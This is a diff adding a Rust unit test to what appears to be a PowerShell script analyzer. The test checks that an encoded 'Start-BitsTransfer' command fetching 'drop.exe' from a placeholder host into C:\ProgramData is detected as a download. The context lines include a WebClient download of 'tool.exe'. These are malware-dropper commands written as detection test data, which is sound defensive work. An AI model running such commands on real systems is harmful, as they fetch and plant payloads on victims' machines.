@@ -7623,6 +7623,26 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn start_bitstransfer_positional_destination_extracted() {
+        let ps =
+            r#"Start-BitsTransfer "https://bitspos.example/drop.exe" "C:\ProgramData\drop.exe""#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://bitspos.example/drop.exe"
+                        && dst.as_deref() == Some("C:\\ProgramData\\drop.exe")
+            )
+        });
+        assert!(
+            has,
+            "no BITS Download destination from positional arguments: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn raw_powershell_downloadfile_variable_url_extracted() {
         let script = r#"$clnt = New-Object System.Net.WebClient
 $url = "http://download.example/tool.exe"
